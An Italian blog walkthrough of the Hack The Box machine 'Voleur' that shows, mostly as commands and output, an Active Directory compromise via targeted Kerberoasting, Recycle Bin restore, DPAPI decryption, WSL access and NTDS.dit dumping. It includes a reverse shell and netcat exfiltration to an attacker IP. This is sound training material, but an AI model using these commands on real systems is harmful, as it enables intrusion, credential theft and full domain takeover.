---
title: 'Voleur HTB: Writeup con Kerberoasting, DPAPI e WSL Privesc'
slug: htb-voleur-walkthrough
description: 'Walkthrough completo di Voleur di Hack The Box: targeted Kerberoasting, abuso AD Recycle Bin, catena DPAPI e privilege escalation via WSL fino ad Administrator.'
image: /voleur-walktrough-writeup-htb-hackthebox.webp
draft: false
date: 2026-07-10T00:00:00.000Z
categories:
  - walkthroughs
subcategories:
  - medium
tags:
  - active-directory
  - kerberoasting
  - dpapi
---

# HTB Voleur Walkthrough: Guida Completa Kerberoasting, DPAPI e Privilege Escalation via WSL

## Introduzione

Voleur è una macchina Active Directory di HackTheBox in scenario "assume breach": si parte già con delle credenziali valide, esattamente come capita in un pentest interno reale dove il cliente fornisce un account a basso privilegio. La catena di attacco tocca praticamente ogni tecnica DPAPI esistente: targeted Kerberoasting, AD Recycle Bin abuse, decrittazione di credenziali salvate via masterkey, fino a un accesso WSL che espone gli hive di registro e permette il dump completo di NTDS.dit.

## Scenario e credenziali iniziali

L'account di partenza fornito da HTB è:

```
ryan.naylor / HollowOct31Nyt
```

## Ricognizione

Una scansione completa delle porte TCP mostra il profilo classico di un Domain Controller:

```
nmap -p- -vvv --min-rate 10000 10.10.11.76
```

```
PORT      STATE SERVICE          
53/tcp    open  domain           
88/tcp    open  kerberos-sec     
135/tcp   open  msrpc            
139/tcp   open  netbios-ssn      
389/tcp   open  ldap             
445/tcp   open  microsoft-ds     
464/tcp   open  kpasswd5         
593/tcp   open  http-rpc-epmap   
636/tcp   open  ldapssl          
2222/tcp  open  EtherNetIP-1     
3268/tcp  open  globalcatLDAP    
3269/tcp  open  globalcatLDAPssl 
5985/tcp  open  wsman            
9389/tcp  open  adws             
```

Una scansione mirata con rilevamento versione conferma il dominio `voleur.htb`, l'hostname `DC`, e soprattutto la porta 2222 con OpenSSH su Ubuntu — anomalo su un host altrimenti interamente Windows. Il campo `clock-skew` segnala 8 ore di scarto, da correggere prima di ogni operazione Kerberos:

```
sudo ntpdate dc.voleur.htb
```

Aggiorno il file hosts con NetExec:

```
netexec smb 10.10.11.76 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

Le credenziali iniziali falliscono su NTLM (`STATUS_NOT_SUPPORTED`, protocollo disabilitato) ma funzionano su Kerberos:

```
netexec smb 10.10.11.76 -u ryan.naylor -p HollowOct31Nyt -k
netexec ldap 10.10.11.76 -u ryan.naylor -p HollowOct31Nyt -k
```

Genero anche il file krb5.conf direttamente da NetExec:

```
netexec smb 10.10.11.76 --generate-krb5-file krb5.conf
sudo cp krb5.conf /etc/krb5.conf
```

## Enumerazione SMB e il file Excel

L'elenco delle share mostra, oltre a quelle di default, `Finance`, `HR`, `IT` (uso NetExec per l'enumerazione, se non lo conosci c'è [una guida completa qui](https://hackita.it/articoli/netexec)):

```
netexec smb 10.10.11.76 -u ryan.naylor -p HollowOct31Nyt -k --shares
```

Ryan Naylor ha accesso in lettura solo su `IT`. Dentro, in `First-Line Support`, c'è un unico file: `Access_Review.xlsx`.

```
smbclient -U 'voleur.htb/ryan.naylor%HollowOct31Nyt' --realm=voleur.htb //dc.voleur.htb/IT
smb: \> ls 'First-Line Support\'
smb: \First-Line Support\> get Access_Review.xlsx
```

Il file è cifrato (CDFV2 Encrypted). Estraggo l'hash della protezione con office2john (parte della suite [John the Ripper](https://hackita.it/articoli/john-the-ripper), utile se non hai mai lavorato con questi tool) e lo craccko:

```
python /opt/john/run/office2john.py Access_Review.xlsx | tee Access_Review.xlsx.hash
hashcat Access_Review.xlsx.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user
```

`hashcat` rileva automaticamente la modalità 9600 (MS Office 2013) e restituisce la password in pochi secondi. Aperto il file, contiene un elenco di utenti con relative password. Provo tutte le combinazioni via Kerberos:

```
netexec smb 10.10.11.76 -u users -p passwords -k --continue-on-success | grep -v KDC_ERR_PREAUTH_FAILED
```

Risultato: `svc_ldap:M1XyC9pW7qT5Vn` e `svc_iis:N5pXyW1VqM7CZ8` sono validi. `Todd.Wolfe` restituisce `KDC_ERR_C_PRINCIPAL_UNKNOWN` — l'account esiste nel foglio Excel ma non è più presente nel dominio: è stato cancellato.

## BloodHound

```
rusthound-ce -d voleur.htb -u ryan.naylor -p HollowOct31Nyt -c All --zip
```

Caricando i dati in BloodHound CE, `svc_ldap` ha privilegi di controllo su `svc_winrm`, membro del gruppo Remote Management Users.

## Targeted Kerberoasting su svc\_winrm

Con il privilegio `WriteSPN` che svc\_ldap possiede su svc\_winrm, aggiungo uno SPN arbitrario con BloodyAD ([guida qui](https://hackita.it/articoli/bloodyad) se non lo conosci):

```
bloodyAD -d voleur.htb -k --host dc.voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn set object svc_winrm servicePrincipalName -v 'http/whatever'
```

Recupero il ticket di servizio (TGS):

```
netexec ldap dc.voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn -k --kerberoasting svc_winrm.hash
```

`hashcat` in modalità 13100 (Kerberos 5, etype 23, TGS-REP) craccka la password contro rockyou.txt quasi istantaneamente:

```
hashcat svc_winrm.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

Password recuperata: `AFireInsidedeOzarctica980219afi`.

In alternativa a BloodyAD+NetExec, lo stesso risultato si ottiene con `targetedKerberoast.py`, che craccka in un colpo solo gli SPN di tutti gli utenti su cui svc\_ldap ha `WriteSPN`:

```
targetedKerberoast.py -d voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn -k --dc-ip 10.129.28.95 --dc-host DC.voleur.htb
```

Perché funzioni serve un ccache Kerberos valido già in cache (ottenuto con `kinit`), altrimenti il tool fallisce con errori di autenticazione anonima. Lo script restituisce un hash anche per `lacey.miller`, che però non si craccka con rockyou — resta un TGS-REP valido ma inutile senza la password giusta nel dizionario, segno che non tutti gli hash ottenuti da un Kerberoasting sono automaticamente sfruttabili.

## Shell come svc\_winrm

Verifico le credenziali e genero un TGT:

```
netexec smb dc.voleur.htb -u svc_winrm -p AFireInsidedeOzarctica980219afi -k
kinit svc_winrm
```

Connessione via evil-winrm con autenticazione Kerberos:

```
evil-winrm -i dc.voleur.htb -r voleur.htb
```

```
*Evil-WinRM* PS C:\Users\svc_winrm\Documents>
```

## Il Recycle Bin di Active Directory

Il Cestino AD risulta abilitato:

```
Get-ADOptionalFeature 'Recycle Bin Feature'
```

Poiché svc\_ldap è membro del gruppo dei restore user, passo a quell'account con RunasCs (svc\_winrm non ha accesso WinRM diretto ad altri):

```
upload RunasCs.exe RunasCs.exe
.\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell -r 10.10.14.6:443
```

Sul listener:

```
rlwrap -cAr nc -lnvp 443
```

Nota pratica: RunasCs dà spesso problemi di compatibilità — build diverse sono compilate per target .NET diversi, e usare la versione sbagliata produce errori tipo `MissingMethodException` o "not a valid application for this OS platform". Prima di caricare il binario, conviene verificare quale .NET Framework gira sul target:

```
(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full\").Release
```

Il valore numerico identifica la versione (es. 528449 = .NET 4.8), da usare per scegliere la build corretta di RunasCs prima di caricarla.

Da questa shell, interrogo il Recycle Bin:

```
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
```

L'oggetto `Todd Wolfe` compare, confermando quanto emerso dal foglio Excel. Ripristino:

```
Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
```

In alternativa, se `get writable --detail` con BloodyAD conferma che svc\_ldap ha diritti di scrittura sull'oggetto cancellato, lo stesso ripristino si fa direttamente da BloodyAD senza passare da una shell PowerShell:

```
bloodyAD -i 10.129.28.95 --host dc.voleur.htb -d voleur.htb -u svc_ldap -k -p 'M1XyC9pW7qT5Vn' set restore "CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb"
```

Più diretto: nessun bisogno di RunasCs né di una reverse shell come svc\_ldap.

Con l'account ripristinato, la password recuperata dal file Excel torna valida. Ottengo shell come todd.wolfe con RunasCs, aggiungendo `--bypass-uac` (il primo tentativo senza fallisce per logon limitato):

```
.\RunasCs.exe todd.wolfe NightT1meP1dg3on14 powershell -r 10.10.14.6:443 --bypass-uac
```

## Percorso alternativo: NetExec tombstone module

Esiste una via più diretta, senza passare da svc\_winrm: un modulo NetExec (`tombstone`) permette di interrogare e ripristinare oggetti cancellati direttamente via LDAP, usando solo le credenziali di svc\_ldap recuperate dal foglio Excel:

```
netexec ldap dc.voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn -k -M tombstone -o ACTION=query
netexec ldap dc.voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn -k -M tombstone -o ACTION=restore ID=1c6b1deb-c372-4cbb-87b1-15031de169db SCHEME=ldap
```

`SCHEME=ldap` è necessario perché LDAPS non è configurato su questo host. Un esempio di come esistano spesso più strade legittime per raggiungere lo stesso obiettivo in un dominio AD.

## Da todd.wolfe a jeremy.combs: la catena DPAPI

todd.wolfe risulta membro del gruppo Second-Line Technicians, con accesso a `IT\Second-Line Support\Archived Users\todd.wolfe` — la sua vecchia home directory, conservata dopo la cancellazione dell'account. Dentro, in `AppData\Roaming\Microsoft\Credentials`, c'è un blob di credenziali cifrato con DPAPI; la relativa masterkey è in `AppData\Roaming\Microsoft\Protect\<SID>`. Per chi non ha chiaro il funzionamento di masterkey/blob, vale la pena leggere prima [DPAPI: teoria e recupero credenziali](https://hackita.it/articoli/dpapi).

Recupero entrambi i file via SMB:

```
smbclient -U 'voleur.htb/todd.wolfe%NightT1meP1dg3on14' --realm=voleur.htb //dc.voleur.htb/IT
smb: \> get "Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3" 772275FAD58525253490A9B0039791D3
smb: \> get "Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\08949382-134f-4c63-b93c-ce52efc0aa88" 08949382-134f-4c63-b93c-ce52efc0aa88
```

Decritto la masterkey con la password nota:

```
dpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
```

Output: `Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83`

Uso quella chiave per decrittare il blob di credenziali:

```
dpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

Risultato: una credenziale salvata per `jeremy.combs:qT3V9pLXyN7W4m`. Verifico e ottengo shell (jeremy.combs è nel gruppo Remote Management Users):

```
netexec smb dc.voleur.htb -u jeremy.combs -p qT3V9pLXyN7W4m -k
kinit jeremy.combs
evil-winrm -i dc.voleur.htb -r voleur.htb
```

## Da jeremy.combs a svc\_backup: la chiave SSH e WSL

jeremy.combs è membro del gruppo Third-Line Technicians, con accesso a `IT\Third-Line Support`:

```
*Evil-WinRM* PS C:\IT\Third-Line Support> ls

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/30/2025   8:11 AM                Backups
-a----         1/30/2025   8:10 AM           2602 id_rsa
-a----         1/30/2025   8:07 AM            186 Note.txt.txt
```

La cartella `Backups` non è accessibile a jeremy.combs. La nota dell'amministratore spiega di aver configurato parzialmente WSL per usare tool di backup Linux — spiegazione della porta 2222 rilevata da nmap.

Provo la chiave SSH con jeremy.combs, fallisce:

```
ssh -i ~/id_rsa jeremy.combs@10.10.11.76 -p 2222
```

Il commento codificato nella chiave rivela il vero proprietario:

```
cat id_rsa | grep -v '\----' | base64 -d | strings
```

Oppure più direttamente:

```
ssh-keygen -y -f id_rsa
```

L'ultima riga dell'output mostra `svc_backup@DC`. Connessione via SSH:

```
ssh -i ~/id_rsa -p 2222 svc_backup@dc.voleur.htb
```

```
Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)
svc_backup@DC:~$
```

## Da svc\_backup ad Administrator: il ponte tra WSL e Windows

Dentro l'ambiente WSL, il disco C: risulta montato su `/mnt/c`. Con i permessi di svc\_backup, accedo a `Third-Line Support/Backups`, negata a jeremy.combs:

```
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ ls
'Active Directory'   registry
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ ls registry/
SECURITY  SYSTEM
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ ls Active\ Directory/
ntds.dit  ntds.jfm
```

Trasferisco i file in locale con netcat invece di scp — utile quando SCP non è disponibile o si preferisce un canale più diretto. Sul mio host, un listener per ogni file:

```
nc -lvnp 80 > SYSTEM
```

Dal target, verso il mio host:

```
cat SYSTEM | nc 10.10.14.6 80
```

Ripeto lo stesso schema (listener locale + `cat file | nc`) per `SECURITY`, `ntds.dit` e `ntds.jfm`.

Dump completo delle credenziali di dominio offline:

```
secretsdump.py LOCAL -system SYSTEM -security SECURITY -ntds ntds.dit
```

L'output include l'hash NTLM dell'Administrator (`e656e07c56d831611b577b160b259ad2`) oltre a quello di tutti gli altri account del dominio.

## Shell come Administrator

Verifico l'hash e ottengo shell con pass-the-hash:

```
netexec smb dc.voleur.htb -u Administrator -H e656e07c56d831611b577b160b259ad2 -k
wmiexec.py voleur.htb/administrator@dc.voleur.htb -no-pass -hashes :e656e07c56d831611b577b160b259ad2 -k
```

```
C:\>whoami
voleur\administrator
```

## Lezioni tecniche principali

* **Targeted Kerberoasting** funziona anche senza SPN preesistente: basta il privilegio `WriteSPN` per aggiungerne uno arbitrario e forzare un TGS craccabile.
* **AD Recycle Bin** non elimina realmente gli oggetti per un periodo configurabile: con permessi di restore, un account "cancellato" torna operativo con le sue vecchie password e i suoi vecchi dati DPAPI.
* **DPAPI** lega le credenziali salvate a una masterkey derivata dalla password utente: recuperare entrambi i file e conoscere la password basta per decrittare tutto offline.
* **WSL (Windows Subsystem for Linux)** è un sottosistema che Microsoft integra in Windows per far girare un ambiente Linux completo (bash, tool nativi Linux) direttamente dentro Windows, senza bisogno di una VM separata. Su un Domain Controller, WSL introduce una superficie d'attacco completamente a sé stante: un proprio SSH, propri utenti Linux, e — punto centrale di questa macchina — accesso diretto al filesystem NTFS dell'host tramite `/mnt/c`, che bypassa le ACL pensate solo per il contesto Windows.

## Conclusione

Macchina carina, niente di particolarmente originale rispetto ad altre AD box con DPAPI/Recycle Bin, ma la parte di privesc finale (arrivare a capire dove sta WSL e cosa espone) fa perdere un po' di tempo se non ci hai mai lavorato prima. Kerberoasting mirato, abuso del Recycle Bin e catena DPAPI restano comunque un pattern solido da portarsi via per qualunque percorso OSCP-like o di preparazione OSCE3.

Macchina disponibile su HackTheBox: [HTB Voleur](https://app.hackthebox.com/machines/Voleur)
